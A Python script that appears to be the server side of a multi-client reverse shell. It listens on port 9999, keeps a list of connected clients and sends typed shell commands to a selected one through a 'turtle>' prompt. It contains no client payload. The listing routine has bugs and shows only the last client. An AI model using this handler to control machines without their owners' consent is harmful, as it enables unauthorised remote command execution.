import socket
import sys
import threading
import time
from queue import Queue

number_of_threads = 2

job_number = [1,2]

queue = Queue()
# creating empty lists so to append clients
all_connections = []

all_address = []

#create a Socket( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port - " + str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + '\n' + "Retrying....")
        bind_socket()


# Handling connections from multiple clients and saving to a list
# closing previous connection when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1) #prevents timeout

            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established : " + address[0])

        except:
            print("Error accepting connections")

# CUSTOM INTERACTIVE SHELL
# 2nd thread functions -1) See all the clients, 2) Select a client, 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle>
# 0 Client-A Port
# 1 Client-B Port
# 2 Client-C Port
# 192.168.0.112> dir
def start_turtle():

    while True:
        cmd = input('turtle>')
        if cmd == 'list' :
            list_connections()

        elif 'select' in cmd:
            conn=get_target(cmd)
            # checking if connection exist or not
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognised ")

# Display all current active connections with the client

def list_connections():
    results = ''

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
    print("-----Clients-----" + '\n' + results)


def get_target(cmd):
    try:
        # target value = id
        target = cmd.replace('select ','')
        target = int(target)
        conn = all_connections[target]
        print("You are know connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + '>',end='')
        return conn
    except:
        print("Selection not valid")


# Send commands to client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit' :
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response , end ='')
        except:
            print("Error in sending Commands")
            break


# Create worker thread
def create_workers():
    for _ in range(number_of_threads):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# to next job that is in the queue (handle connections , send commands)
def work():
    while True:
        x = queue.get()
        if x==1 :
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2 :
            start_turtle()

        queue.task_done()

# Create jobs
def create_jobs():
    for x in job_number:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()













